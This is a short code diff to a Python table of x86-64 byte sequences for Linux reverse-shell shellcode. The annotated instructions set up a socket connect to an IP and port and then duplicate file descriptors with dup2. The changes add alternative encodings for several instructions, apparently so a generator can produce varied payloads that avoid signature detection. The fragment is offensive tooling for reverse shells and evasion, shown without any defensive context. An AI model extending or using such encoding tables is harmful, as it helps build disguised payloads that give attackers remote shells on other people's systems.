@@ -13,10 +13,10 @@ linux_x64 = [
     [r"\x48\xff\xc7", r"\x48\x83\xc7\x01"], # INC RDI
     [r"\x0f\x05"],     # SYSCALL
     [r"\x48\x97"],     # XCHG RAX, RDI
-    [r"\x48\x31\xc0", r"\x48\x29\xc0", r"\x48\x89\xc0\x48\x31\xc0", r"\x48\x83\xe0\xff"], # XOR RAX
-    [r"\xb0\x2a"],     # mov al, 0x2a
+    [r"\x48\x31\xc0", r"\x48\x29\xc0", r"\x48\x89\xc0\x48\x31\xc0"], # XOR RAX
+    [r"\xb0\x2a", r"\x04\x2a"], # mov al, 0x2a 
     [r"\x52"],         # PUSH RDX
-    [r"\x41\xb9"], # MOV R9, IP
+    [r"\x41\xb9"], # MOV R9, IP  
     [r"\x49\x81\xe1"], # AND R9, MASK
     [r"\x41\x51"], # PUSH R9
     [r"\x66\x68"],     # PSHW PORT
@@ -28,10 +28,10 @@ linux_x64 = [
     [r"\x0f\x05"],     # SYSCALL
     [r"\x48\x31\xf6", r"\x48\x29\xf6"], # XOR RSI
     [r"\x31\xd2", r"\x29\xd2"],     # XOR EDX, EDX
-    [r"\x80\xc2\x03"], # ADD DL, 0x3
+    [r"\x80\xc2\x03", r"\xb2\x03"], # ADD DL, 0x3
     [""],
     [r"\x48\x31\xc0", r"\x48\x29\xc0"], # XOR RAX
-    [r"\x04\x21"],     # ADD AL, 0x21
+    [r"\x04\x21", r"\xb0\x21", r"\x2C\xDF"],     # ADD AL, 0x21           
     [r"\x0f\x05"],     # SYSCALL
     [r"\x48\xff\xc6", r"\x48\x83\xc6\x01"], # INC RSI
     [r"\x48\x39\xd6"], # CMP RDX, RSI
